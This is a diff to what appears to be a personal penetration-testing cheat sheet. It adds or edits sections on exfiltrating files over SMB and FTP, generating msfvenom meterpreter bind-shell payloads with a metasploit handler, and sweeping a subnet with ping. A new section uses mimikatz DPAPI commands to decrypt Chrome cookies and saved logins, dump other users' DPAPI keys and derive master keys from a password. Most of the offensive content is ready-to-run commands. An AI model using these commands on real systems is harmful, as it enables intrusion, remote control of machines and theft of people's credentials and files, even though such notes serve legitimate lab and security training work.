@@ -170,6 +170,15 @@ Sometimes you can't communicate directly back to your attack machine from the ta
 * [ngrok](https://ngrok.com/): Free service that lets you expose HTTP and TCP ports on your machine on an `*.ngrok.io` domain on the public web. Probably the best option in this list.
 * [requestbin](http://requestbin.net/): Free service for receiving HTTP requests. More useful for SSRF or XSS challenges where you do not need to control the application server talking back to the target. This site also provides [dnsbin](http://requestbin.net/dns).
 
+### SMB File Exfiltration
+
+Host files from a Kali workstation with:
+
+```sh
+mkdir smb-files
+impacket-smbserver -smb2support MySmbTransferShare ./smb-files
+```
+
 ### FTP File Exfiltration
 
 #### Pushing
@@ -184,29 +193,29 @@ If you can reach a target that has an FTP server, you probably want those files.
 import sys
 from ftplib import FTP
 
-HOST = '10.10.10.10'
-USER, PASS = 'anonymous', 'anonymous@'
+HOST = "10.10.10.10"
+USER, PASS = "anonymous", "anonymous@"
 
 FILES_TO_EXFIL = [
-    'secret-data.txt',
-    'another-script.py',
+    "secret-data.txt",
+    "another-script.py",
 ]
 
 ftp = FTP(HOST)
 ftp.login(USER, PASS)
-ftp.retrlines('LIST')
+ftp.retrlines("LIST")
 
 for f in FILES_TO_EXFIL:
-    sys.stdout.write(ftp.retrbinary('RETR ' + f, open(f, 'wb').write) + '\n')
+    sys.stdout.write(ftp.retrbinary("RETR " + f, open(f, "wb").write) + "\n")
 
 ftp.quit()
 ```
 
 You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).
 
-### Internal Network Enumeration
+## Internal Network Enumeration
 
-### Meterpreter Payload
+### Meterpreter Payload Generation
 
 Here are some snippets for generating common meterpreter payloads:
 
@@ -239,14 +248,10 @@ msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f
 msfvenom -p windows/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86_${LISTEN_PORT}.exe"
 ```
 
-When ready, set up a meterpreter listener/connector using something like the following metasploit commands:
+When ready, set up a meterpreter listener/connector using something like the following metasploit command:
 
 ```
-use exploit/multi/handler
-set payload windows/x64/meterpreter/bind_tcp
-set LHOST 10.10.10.88
-set LPORT 443
-run -j
+handler -H 10.10.10.10 -P 443 -p windows/x64/meterpreter/bind_tcp
 ```
 
 ### Routing through Sessions
@@ -278,6 +283,64 @@ If you don't care about being too loud, this `ping` snippet is a quick-and-dirty
 export SUBNET=192.168.33
 for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
 ```
+
+## Windows Pivoting/Tooling
+
+### Impacket Family of Tools
+
+TODO
+
+### Active Directory Enumeration
+
+TODO
+
+### Powershell Empire
+
+TODO
+
+### Pillaging Credentials
+
+#### DPAPI Fun with Mimikatz
+
+[DPAPI](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) credential decryption; in user-mode, DPAPI provides a set of encryption/decryption routines using a master key derived from a user's password. This is used by things like Chrome to encrypt cookies and saved logins (`harmj0y` link provides details on this).
+
+For example, the following mimikatz command will list out Chrome's stored cookie names and associated domains (the lack of a provided password means the actual values cannot be decrypted):
+
+```bat
+:: List out cookies.
+dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies”
+
+:: If executing in the context of the user that "owns" those cookies, we can decrypt without the password.
+dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” /unprotect
+```
+
+It may be possible to dump the DPAPI keys for other logged in users via the following:
+
+```bat
+sekurlsa::dpapi
+```
+
+Finally, we can also derive a user's master key itself through the following (requires the user's password):
+
+```bat
+mkdir .\workspace
+
+:: Get user's SID and needed files from subdirectory listed in below directory.
+dir \users\security\appdata\roaming\microsoft\protect
+copy \users\security\appdata\roaming\microsoft\protect\<SID>\<HEX FILENAME> .\workspace
+
+:: Now, in mimikatz shell, use dpapi command to get the masterkey.
+dpapi::masterkey /in:<HEX FILENAME> /sid:<SID> /password:<USER'S PASSWORD>
+:: This should display the masterkey, which is also stored the mimikatz session. If we
+:: can't make use of a continous mimikatz session, then DPAPI keys can be specified in
+:: commands with the /masterkey option. This cache can always be viewed with
+:: dpapi::cache.
+
+:: Now, we can decrypt encrypted credentials like:
+dpapi::cred /in:<FILENAME>
+```
+
+Also see [the mimikatz wiki article on decrypting Credential Manager stored credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials). The `harmj0y` post linked above also goes into detail about more advanced domain techniques.
 
 ## Spraying Creds
 
